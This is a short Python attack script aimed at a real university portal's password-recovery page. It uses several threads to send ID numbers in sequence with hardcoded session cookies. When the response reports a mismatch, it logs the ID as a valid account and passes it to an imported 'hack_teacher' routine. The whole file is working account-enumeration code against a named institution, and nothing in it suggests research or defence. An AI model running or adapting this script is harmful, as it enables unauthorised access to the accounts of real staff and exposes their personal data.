import threading

import requests

from hack_hznu_teacher import hack_teacher

api = 'http://my.hznu.edu.cn/getBackPasswordByQuestion.portal'


def log(msg):
    with open('teacher.txt', 'a+') as file:
        msg = str(msg) + '\n'
        print(msg)
        file.write(msg)


headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
}

cookies = {
    'AMAuthCookie': 'AQIC5wM2LY4SfcyvNs13CaKhTHvJaXEiWmnlTMqccekCZLI%3D%40AAJTSQACMDE%3D%23',
    'amlbcookie': '01',
    'JSESSIONID': '0000pBMJqwG-5W88yEv4zAO4uw8:18ahc0q48',
}

BASE_STU_NUM = 20110000


def init_data(stu_num):
    return {
        'id': stu_num,
        '_target1': '下一步',
        'attributes[\'birthday\']': '2016-11-01',
    }


def check_stu_num(base_stu):
    for i in range(200):
        stu_num = base_stu + i
        data = init_data(stu_num)
        resp = requests.post(api, data=data, headers=headers, cookies=cookies)
        if '不匹配' in resp.text:
            log(stu_num)
            hack_teacher(stu_num)


STU_NUMS = [20000000 + x * 10000 for x in range(6, 15)]

for i in STU_NUMS:
    t = threading.Thread(target=check_stu_num, args=(i,))
    t.start()
